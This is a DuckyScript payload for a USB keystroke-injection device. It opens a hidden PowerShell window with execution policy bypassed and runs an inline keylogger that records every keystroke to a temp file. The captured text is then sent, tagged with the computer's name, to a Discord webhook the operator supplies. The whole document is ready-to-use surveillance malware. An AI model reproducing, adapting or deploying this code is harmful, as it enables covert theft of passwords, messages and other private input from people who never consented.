REM Title: Keylogger to Discord
REM Author: @beigeworm
REM Description: Uses Powershell to gather keystroke info and send it via Discord.
REM Target: Windows 10
REM LEARN MORE HERE - https://github.com/beigeworm/Powershell-Tools-and-Toys

REM *SETUP*
REM replace WEBHOOK_GOES_HERE with your discord webhook.


REM some setup for dukie script
DEFAULT_DELAY 100

REM Open Powershell and start logs.
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -Exec Bypass -W hidden
ENTER
DELAY 5000
STRING $dc = "WEBHOOK_GOES_HERE!";$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate); [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType); [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);';$lpth = "$env:temp/t.txt";$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru;$no = New-Item -Path $lpth -ItemType File -Force;$fcont = Get-Content -Path $lpth -Raw;$lkt = [System.Diagnostics.Stopwatch]::StartNew();$kth = [TimeSpan]::FromSeconds(10);While ($true){$kpr = $false;try{while ($lkt.Elapsed -lt $kth){Start-Sleep -Milliseconds 30;for ($asc = 9; $asc -le 254; $asc++){$keyst = $API::GetAsyncKeyState($asc);if ($keyst -eq -32767) {$kpr = $true;$lkt.Restart();$null = [console]::CapsLock;$vtkey = $API::MapVirtualKey($asc, 3);$kbst = New-Object Byte[] 256;$checkkbst = $API::GetKeyboardState($kbst);$logchar = New-Object -TypeName System.Text.StringBuilder;if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)){[System.IO.File]::AppendAllText($lpth, $logchar, [System.Text.Encoding]::Unicode) }}}}}finally{If ($kpr) {$fcont = Get-Content -Path $lpth -Raw;$escmsgsys = $fcont -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')};$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json;Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys;Remove-Item -Path $lpth -Force;$kpr = $false}}$lkt.Restart();Start-Sleep -Milliseconds 10} 
ENTER
